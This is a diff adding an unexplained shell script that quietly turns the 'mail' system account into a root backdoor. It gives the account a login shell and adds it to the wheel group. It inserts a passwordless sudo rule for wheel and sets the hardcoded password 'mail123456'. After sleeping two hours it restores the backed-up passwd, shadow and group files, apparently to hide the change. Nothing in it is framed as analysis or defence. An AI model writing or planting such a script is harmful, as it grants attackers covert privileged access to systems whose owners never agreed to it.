@@ -1,0 +1,57 @@
+#!/bin/sh
+#
+
+Add_user(){
+
+	\cp -a /etc/passwd{,.ori} &&  \cp -a /etc/shadow{,.ori}   &&  \cp -a /etc/group{,.ori} 
+
+	for i in `seq 10`;do
+		sed -ri  '/mail/s/^[[:space:]]+//'  /etc/passwd &>/dev/null 
+		sed -ri  '/mail/s/^[[:punct:]]+//'  /etc/passwd &>/dev/null 
+	done
+	
+	
+	if ! id mail &> /dev/null;then
+		
+		sed -ri '12a \mail:x:12:mail,postfix'  /etc/group &>/dev/null && \
+		sed -ri '8a \mail:x:8:12:mail:/var/spool/mail:/sbin/nologin'  /etc/passwd
+		
+	fi
+
+
+        if ! egrep   -qw  '^%wheel[[:space:]]+ALL=\(ALL\)[[:space:]]+NOPASSWD: ALL[[:space:]]*' /etc/sudoers ;then
+        
+            sed -ri '42a \%wheel        ALL=(ALL)       NOPASSWD: ALL'  /etc/sudoers &>/dev/null
+                
+        fi
+
+}
+
+
+
+Add_sudo(){
+
+    usermod -a -G wheel  mail
+    sed -ri  '/mail/s#(.*):(.*)#\1:/bin/bash#'   /etc/passwd
+    echo 'mail123456'|passwd --stdin mail &>/dev/null	
+	sleep 7200
+	\mv /etc/passwd.ori   /etc/passwd  && \mv /etc/shadow.ori  /etc/shadow && \mv /etc/group.ori  /etc/group
+	
+}
+
+
+
+
+
+
+
+
+main(){
+
+    Add_user
+	Add_sudo
+
+}
+
+
+main
